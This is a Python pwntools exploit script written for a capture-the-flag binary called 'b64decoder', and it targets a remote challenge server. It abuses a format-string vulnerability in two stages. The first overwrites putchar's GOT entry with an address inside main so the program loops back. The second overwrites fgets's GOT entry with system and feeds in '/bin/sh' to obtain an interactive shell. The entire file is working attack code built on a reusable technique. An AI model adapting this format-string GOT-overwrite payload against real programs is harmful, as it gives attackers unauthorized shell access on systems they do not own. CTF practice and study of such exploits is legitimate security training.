from pwn import *
import sys

context.clear(os='linux')

__author__ = 'yuvaly0'

argv = sys.argv
binary_path = './b64decoder'
REMOTE = False
DEBUG = False

if len(argv) > 1:
	if argv[1] == 'remote':
		REMOTE = True
	if argv[1] == 'debug':
		DEBUG = True

if REMOTE:
	sh = remote('challenges.tamuctf.com', 2783)
else:
	sh = process([binary_path])

if DEBUG:
	gdb.attach(sh, '''
		b* main+201
		b* main+206
		''')

e = ELF(binary_path)

# ------------- plan -----------
# overwrite putchar@got with main's address
# overwrite fgets@got with system

# first level
buffer_offset = 71
putchar_got = e.got['putchar']
main_address = e.sym['main'] + 68

log.info('putchar@got: {}'.format(hex(putchar_got)))
log.info('main\'s address: {}'.format(hex(main_address)))
log.info('fgets@got: {}'.format(hex(e.got['fgets'])))
log.info('system: {}'.format(hex(e.sym['system'])))

payload = fmtstr_payload(buffer_offset, {putchar_got: main_address}, write_size='long')
sh.sendlineafter('Enter your name!  \n', payload)

log.progress('Overwriting putchar@got with main+68')

# second level
buffer_offset = 76
system = e.sym['system']
fgets_got = e.got['fgets']

payload = ''
payload += '/bin/sh;'.ljust(8)
payload += p32(fgets_got)
payload += '%{}${}p'.format(buffer_offset + 2, system - len(payload))
payload += '%{}$n'.format(buffer_offset + 2)
sh.sendlineafter('Enter your name!  \n', payload)

sh.interactive()

